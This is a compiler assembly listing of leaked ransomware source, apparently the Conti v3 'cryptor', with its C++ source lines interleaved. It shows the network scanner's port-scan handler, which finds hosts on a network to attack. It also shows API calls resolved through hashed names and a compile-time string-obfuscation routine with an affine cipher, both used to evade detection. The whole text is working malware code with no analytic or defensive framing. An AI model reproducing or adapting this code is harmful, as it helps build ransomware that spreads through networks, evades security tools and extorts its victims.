; 486  : 	pFunction = (HGLOBAL(WINAPI*)(HGLOBAL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8d87ce2b, 67);//GetProcAddress(hKernel32, OBFA("GlobalFree"));

  001fa	ba 0f 00 00 00	 mov	 edx, 15
  001ff	44 8d 4a 34	 lea	 r9d, QWORD PTR [rdx+52]
  00203	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 487  : 	return pFunction(hMem);

  00208	48 8b cf	 mov	 rcx, rdi
  0020b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 548  : 				while (!TAILQ_EMPTY(&g_ConnectionList)) {

  0020d	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  00214	48 85 ff	 test	 rdi, rdi
  00217	0f 85 73 ff ff
	ff		 jne	 $LL4@PortScanHa
$LN5@PortScanHa:

; 515  : 		BOOL Success = (BOOL)pGetQueuedCompletionStatus(g_IocpHandle, &dwBytesTransferred, &CompletionStatus, (LPOVERLAPPED*)&ConnectContext, INFINITE);

  0021d	e8 00 00 00 00	 call	 ?CreateHostTable@@YAHXZ	; CreateHostTable
  00222	85 c0		 test	 eax, eax
  00224	0f 84 ca 01 00
	00		 je	 $LN90@PortScanHa
  0022a	e8 00 00 00 00	 call	 ?ScanHosts@@YAXXZ	; ScanHosts
  0022f	ba 0f 00 00 00	 mov	 edx, 15
  00234	41 b8 db bf 9c
	e5		 mov	 r8d, -442712101		; e59cbfdbH
  0023a	44 8d 4a 3e	 lea	 r9d, QWORD PTR [rdx+62]
  0023e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00243	44 89 74 24 30	 mov	 DWORD PTR [rsp+48], r14d
  00248	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?TimerCallback@@YAXPEAXE@Z ; TimerCallback
  0024f	44 89 74 24 28	 mov	 DWORD PTR [rsp+40], r14d
  00254	48 8d 4c 24 48	 lea	 rcx, QWORD PTR hTimer$[rsp]
  00259	45 33 c9	 xor	 r9d, r9d
  0025c	c7 44 24 20 30
	75 00 00	 mov	 DWORD PTR [rsp+32], 30000 ; 00007530H
  00264	48 8b d5	 mov	 rdx, rbp
  00267	ff d0		 call	 rax
  00269	85 c0		 test	 eax, eax
  0026b	0f 85 7b 01 00
	00		 jne	 $LN38@PortScanHa
  00271	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  00274	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  0027a	44 8d 48 47	 lea	 r9d, QWORD PTR [rax+71]
  0027e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00283	b9 01 00 00 00	 mov	 ecx, 1
  00288	ff d0		 call	 rax
  0028a	41 8b f6	 mov	 esi, r14d
  0028d	e9 de fd ff ff	 jmp	 $LL2@PortScanHa
$LN22@PortScanHa:

; 554  : 					pGlobalFree(ConnectCtx);
; 555  : 
; 556  : 				}
; 557  : 
; 558  : 				if (!CreateHostTable()) {
; 559  : 					break;
; 560  : 				}
; 561  : 
; 562  : 				ScanHosts();
; 563  : 
; 564  : 				if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {
; 565  : 					pExitThread(EXIT_FAILURE);
; 566  : 				}
; 567  : 
; 568  : 				IsTimerActivated = FALSE;
; 569  : 
; 570  : 			}
; 571  : 
; 572  : 		} else if (CompletionStatus == TIMER_COMPLETION_KEY) {

  00292	48 83 f9 03	 cmp	 rcx, 3
  00296	0f 85 d4 fd ff
	ff		 jne	 $LL2@PortScanHa

; 573  : 
; 574  : 			IsTimerActivated = TRUE;
; 575  : 
; 576  : 			if (g_ActiveOperations) {

  0029c	44 39 35 00 00
	00 00		 cmp	 DWORD PTR ?g_ActiveOperations@@3JA, r14d ; g_ActiveOperations
  002a3	8d 71 fe	 lea	 esi, QWORD PTR [rcx-2]
  002a6	74 41		 je	 SHORT $LN89@PortScanHa

; 579  : 				TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

  002a8	48 8b 1d 00 00
	00 00		 mov	 rbx, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  002af	48 85 db	 test	 rbx, rbx
  002b2	0f 84 b8 fd ff
	ff		 je	 $LL2@PortScanHa
$LL11@PortScanHa:

; 580  : 
; 581  : 					if (ConnectCtx->State == CONNECTING) {

  002b8	40 38 73 2c	 cmp	 BYTE PTR [rbx+44], sil
  002bc	75 1d		 jne	 SHORT $LN9@PortScanHa

; 582  : 						pCancelIo((HANDLE)ConnectCtx->s);

  002be	48 8b 7b 20	 mov	 rdi, QWORD PTR [rbx+32]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 51   : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1cae2a52, 109);//GetProcAddress(hKernel32, OBFA("CancelIo"));

  002c2	ba 0f 00 00 00	 mov	 edx, 15
  002c7	41 b8 52 2a ae
	1c		 mov	 r8d, 481176146		; 1cae2a52H
  002cd	44 8d 4a 5e	 lea	 r9d, QWORD PTR [rdx+94]
  002d1	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 52   : 	return pFunction(hFile);

  002d6	48 8b cf	 mov	 rcx, rdi
  002d9	ff d0		 call	 rax
$LN9@PortScanHa:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 579  : 				TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

  002db	48 8b 5b 30	 mov	 rbx, QWORD PTR [rbx+48]
  002df	48 85 db	 test	 rbx, rbx
  002e2	75 d4		 jne	 SHORT $LL11@PortScanHa

; 583  : 					}
; 584  : 
; 585  : 				}
; 586  : 
; 587  : 			} else {

  002e4	e9 87 fd ff ff	 jmp	 $LL2@PortScanHa
$LN89@PortScanHa:

; 589  : 				while (!TAILQ_EMPTY(&g_ConnectionList)) {

  002e9	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  002f0	48 85 ff	 test	 rdi, rdi
  002f3	0f 84 91 00 00
	00		 je	 $LN13@PortScanHa
  002f9	0f 1f 80 00 00
	00 00		 npad	 7
$LL12@PortScanHa:

; 590  : 
; 591  : 					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);
; 592  : 					pshutdown(ConnectCtx->s, SD_SEND);

  00300	48 8b 5f 20	 mov	 rbx, QWORD PTR [rdi+32]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 957  : 	pFunction = (int(WINAPI*)(SOCKET, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8f9390c3, 28);//GetProcAddress(hWs2_32, OBFA("shutdown"));

  00304	ba 15 00 00 00	 mov	 edx, 21
  00309	41 b8 c3 90 93
	8f		 mov	 r8d, -1886154557	; 8f9390c3H
  0030f	44 8d 4a 07	 lea	 r9d, QWORD PTR [rdx+7]
  00313	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 958  : 	return pFunction(s, how);

  00318	8b d6		 mov	 edx, esi
  0031a	48 8b cb	 mov	 rcx, rbx
  0031d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 593  : 					pclosesocket(ConnectCtx->s);

  0031f	48 8b 5f 20	 mov	 rbx, QWORD PTR [rdi+32]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 883  : 	pFunction = (int(WINAPI*)(SOCKET))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3e3c66ba, 34);//GetProcAddress(hWs2_32, OBFA("closesocket"));

  00323	ba 15 00 00 00	 mov	 edx, 21
  00328	41 b8 ba 66 3c
	3e		 mov	 r8d, 1044145850		; 3e3c66baH
  0032e	44 8d 4a 0d	 lea	 r9d, QWORD PTR [rdx+13]
  00332	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 884  : 	return pFunction(s);

  00337	48 8b cb	 mov	 rcx, rbx
  0033a	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 594  : 					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);

  0033c	48 8b 4f 30	 mov	 rcx, QWORD PTR [rdi+48]
  00340	48 8b 47 38	 mov	 rax, QWORD PTR [rdi+56]
  00344	48 85 c9	 test	 rcx, rcx
  00347	74 06		 je	 SHORT $LN35@PortScanHa
  00349	48 89 41 38	 mov	 QWORD PTR [rcx+56], rax
  0034d	eb 07		 jmp	 SHORT $LN36@PortScanHa
$LN35@PortScanHa:
  0034f	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8, rax
$LN36@PortScanHa:
  00356	48 8b 57 38	 mov	 rdx, QWORD PTR [rdi+56]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 486  : 	pFunction = (HGLOBAL(WINAPI*)(HGLOBAL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8d87ce2b, 67);//GetProcAddress(hKernel32, OBFA("GlobalFree"));

  0035a	41 b8 2b ce 87
	8d		 mov	 r8d, -1920479701	; 8d87ce2bH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 594  : 					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);

  00360	48 8b 47 30	 mov	 rax, QWORD PTR [rdi+48]
  00364	48 89 02	 mov	 QWORD PTR [rdx], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 486  : 	pFunction = (HGLOBAL(WINAPI*)(HGLOBAL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8d87ce2b, 67);//GetProcAddress(hKernel32, OBFA("GlobalFree"));

  00367	ba 0f 00 00 00	 mov	 edx, 15
  0036c	44 8d 4a 34	 lea	 r9d, QWORD PTR [rdx+52]
  00370	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 487  : 	return pFunction(hMem);

  00375	48 8b cf	 mov	 rcx, rdi
  00378	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 589  : 				while (!TAILQ_EMPTY(&g_ConnectionList)) {

  0037a	48 8b 3d 00 00
	00 00		 mov	 rdi, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  00381	48 85 ff	 test	 rdi, rdi
  00384	0f 85 76 ff ff
	ff		 jne	 $LL12@PortScanHa
$LN13@PortScanHa:

; 595  : 					pGlobalFree(ConnectCtx);
; 596  : 
; 597  : 				}
; 598  : 
; 599  : 				if (!CreateHostTable()) {

  0038a	e8 00 00 00 00	 call	 ?CreateHostTable@@YAHXZ	; CreateHostTable
  0038f	85 c0		 test	 eax, eax
  00391	74 61		 je	 SHORT $LN90@PortScanHa

; 600  : 					break;
; 601  : 				}
; 602  : 
; 603  : 				ScanHosts();

  00393	e8 00 00 00 00	 call	 ?ScanHosts@@YAXXZ	; ScanHosts
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 387  : 	pFunction = (BOOL(WINAPI*)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xe59cbfdb, 77);//GetProcAddress(hKernel32, OBFA("CreateTimerQueueTimer"));

  00398	ba 0f 00 00 00	 mov	 edx, 15
  0039d	41 b8 db bf 9c
	e5		 mov	 r8d, -442712101		; e59cbfdbH
  003a3	44 8d 4a 3e	 lea	 r9d, QWORD PTR [rdx+62]
  003a7	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 388  : 	return pFunction(phNewTimer, TimerQueue, Callback, DueTime, Period, Flags, Parameter);

  003ac	44 89 74 24 30	 mov	 DWORD PTR [rsp+48], r14d
  003b1	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?TimerCallback@@YAXPEAXE@Z ; TimerCallback
  003b8	44 89 74 24 28	 mov	 DWORD PTR [rsp+40], r14d
  003bd	48 8d 4c 24 48	 lea	 rcx, QWORD PTR hTimer$[rsp]
  003c2	45 33 c9	 xor	 r9d, r9d
  003c5	c7 44 24 20 30
	75 00 00	 mov	 DWORD PTR [rsp+32], 30000 ; 00007530H
  003cd	48 8b d5	 mov	 rdx, rbp
  003d0	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 605  : 				if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {

  003d2	85 c0		 test	 eax, eax
  003d4	75 16		 jne	 SHORT $LN38@PortScanHa
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  003d6	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  003d9	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  003df	44 8d 48 47	 lea	 r9d, QWORD PTR [rax+71]
  003e3	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  003e8	8b ce		 mov	 ecx, esi
  003ea	ff d0		 call	 rax
$LN38@PortScanHa:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 609  : 				IsTimerActivated = FALSE;

  003ec	41 8b f6	 mov	 esi, r14d

; 610  : 			}
; 611  : 
; 612  : 		}
; 613  : 
; 614  : 	}

  003ef	e9 7c fc ff ff	 jmp	 $LL2@PortScanHa
$LN90@PortScanHa:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 405  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x6998a9d3, 75);//GetProcAddress(hKernel32, OBFA("DeleteTimerQueue"));

  003f4	ba 0f 00 00 00	 mov	 edx, 15
  003f9	41 b8 d3 a9 98
	69		 mov	 r8d, 1771612627		; 6998a9d3H
  003ff	44 8d 4a 3c	 lea	 r9d, QWORD PTR [rdx+60]
  00403	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 406  : 	return pFunction(TimerQueue);

  00408	48 8b cd	 mov	 rcx, rbp
  0040b	ff d0		 call	 rax

; 445  : 	pFunction = (void(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xa7be41e8, 71);//GetProcAddress(hKernel32, OBFA("ExitThread"));

  0040d	ba 0f 00 00 00	 mov	 edx, 15
  00412	41 b8 e8 41 be
	a7		 mov	 r8d, -1480703512	; a7be41e8H
  00418	44 8d 4a 38	 lea	 r9d, QWORD PTR [rdx+56]
  0041c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 446  : 	return pFunction(dwExitCode);

  00421	33 c9		 xor	 ecx, ecx
  00423	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 618  : 	return EXIT_SUCCESS;

  00425	33 c0		 xor	 eax, eax

; 619  : }

  00427	48 8b 4c 24 68	 mov	 rcx, QWORD PTR __$ArrayPad$[rsp]
  0042c	48 33 cc	 xor	 rcx, rsp
  0042f	e8 00 00 00 00	 call	 __security_check_cookie
  00434	4c 8d 5c 24 70	 lea	 r11, QWORD PTR [rsp+112]
  00439	49 8b 5b 10	 mov	 rbx, QWORD PTR [r11+16]
  0043d	49 8b 6b 18	 mov	 rbp, QWORD PTR [r11+24]
  00441	49 8b 73 20	 mov	 rsi, QWORD PTR [r11+32]
  00445	49 8b 7b 28	 mov	 rdi, QWORD PTR [r11+40]
  00449	49 8b e3	 mov	 rsp, r11
  0044c	41 5e		 pop	 r14
  0044e	c3		 ret	 0
?PortScanHandler@@YAKPEAX@Z ENDP			; PortScanHandler
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 3e 00 00
	00		 mov	 r10d, 62		; 0000003eH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 03 00 00 00	 mov	 eax, 3
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1b	 imul	 ecx, eax, 27

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 68	 mov	 BYTE PTR [rcx+1], 104	; 00000068H
  00007	c6 41 02 03	 mov	 BYTE PTR [rcx+2], 3
  0000b	c6 41 03 75	 mov	 BYTE PTR [rcx+3], 117	; 00000075H
  0000f	c6 41 04 03	 mov	 BYTE PTR [rcx+4], 3
  00013	c6 41 05 5d	 mov	 BYTE PTR [rcx+5], 93	; 0000005dH
  00017	c6 41 06 03	 mov	 BYTE PTR [rcx+6], 3
  0001b	c6 41 07 3a	 mov	 BYTE PTR [rcx+7], 58	; 0000003aH
  0001f	c6 41 08 03	 mov	 BYTE PTR [rcx+8], 3
  00023	c6 41 09 79	 mov	 BYTE PTR [rcx+9], 121	; 00000079H
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	c6 41 0b 6e	 mov	 BYTE PTR [rcx+11], 110	; 0000006eH
  0002f	c6 41 0c 03	 mov	 BYTE PTR [rcx+12], 3
  00033	c6 41 0d 54	 mov	 BYTE PTR [rcx+13], 84	; 00000054H
  00037	c6 41 0e 03	 mov	 BYTE PTR [rcx+14], 3
  0003b	c6 41 0f 1b	 mov	 BYTE PTR [rcx+15], 27
  0003f	c6 41 10 03	 mov	 BYTE PTR [rcx+16], 3
  00043	c6 41 11 33	 mov	 BYTE PTR [rcx+17], 51	; 00000033H
  00047	c6 41 12 03	 mov	 BYTE PTR [rcx+18], 3
  0004b	c6 41 13 75	 mov	 BYTE PTR [rcx+19], 117	; 00000075H
  0004f	c6 41 14 03	 mov	 BYTE PTR [rcx+20], 3
  00053	c6 41 15 79	 mov	 BYTE PTR [rcx+21], 121	; 00000079H
  00057	c6 41 16 03	 mov	 BYTE PTR [rcx+22], 3
  0005b	c6 41 17 33	 mov	 BYTE PTR [rcx+23], 51	; 00000033H
  0005f	c6 41 18 03	 mov	 BYTE PTR [rcx+24], 3
  00063	c6 41 19 6e	 mov	 BYTE PTR [rcx+25], 110	; 0000006eH
  00067	c6 41 1a 03	 mov	 BYTE PTR [rcx+26], 3
  0006b	c6 41 1b 3c	 mov	 BYTE PTR [rcx+27], 60	; 0000003cH
  0006f	c6 41 1c 03	 mov	 BYTE PTR [rcx+28], 3
  00073	c6 41 1d 0d	 mov	 BYTE PTR [rcx+29], 13
  00077	c6 41 1e 03	 mov	 BYTE PTR [rcx+30], 3
  0007b	c6 41 1f 1b	 mov	 BYTE PTR [rcx+31], 27
  0007f	c6 41 20 03	 mov	 BYTE PTR [rcx+32], 3
  00083	c6 41 21 79	 mov	 BYTE PTR [rcx+33], 121	; 00000079H
  00087	c6 41 22 03	 mov	 BYTE PTR [rcx+34], 3
  0008b	c6 41 23 6e	 mov	 BYTE PTR [rcx+35], 110	; 0000006eH
  0008f	c6 41 24 03	 mov	 BYTE PTR [rcx+36], 3
  00093	c6 41 25 4a	 mov	 BYTE PTR [rcx+37], 74	; 0000004aH
  00097	c6 41 26 03	 mov	 BYTE PTR [rcx+38], 3
  0009b	c6 41 27 54	 mov	 BYTE PTR [rcx+39], 84	; 00000054H
  0009f	c6 41 28 03	 mov	 BYTE PTR [rcx+40], 3
  000a3	c6 41 29 75	 mov	 BYTE PTR [rcx+41], 117	; 00000075H
  000a7	c6 41 2a 03	 mov	 BYTE PTR [rcx+42], 3
  000ab	c6 41 2b 5d	 mov	 BYTE PTR [rcx+43], 93	; 0000005dH
  000af	c6 41 2c 03	 mov	 BYTE PTR [rcx+44], 3
  000b3	c6 41 2d 6e	 mov	 BYTE PTR [rcx+45], 110	; 0000006eH
  000b7	c6 41 2e 03	 mov	 BYTE PTR [rcx+46], 3
  000bb	c6 41 2f 79	 mov	 BYTE PTR [rcx+47], 121	; 00000079H
  000bf	c6 41 30 03	 mov	 BYTE PTR [rcx+48], 3
  000c3	c6 41 31 41	 mov	 BYTE PTR [rcx+49], 65	; 00000041H
  000c7	c6 41 32 03	 mov	 BYTE PTR [rcx+50], 3
  000cb	c6 41 33 1b	 mov	 BYTE PTR [rcx+51], 27
  000cf	c6 41 34 03	 mov	 BYTE PTR [rcx+52], 3
  000d3	c6 41 35 33	 mov	 BYTE PTR [rcx+53], 51	; 00000033H
  000d7	c6 41 36 03	 mov	 BYTE PTR [rcx+54], 3
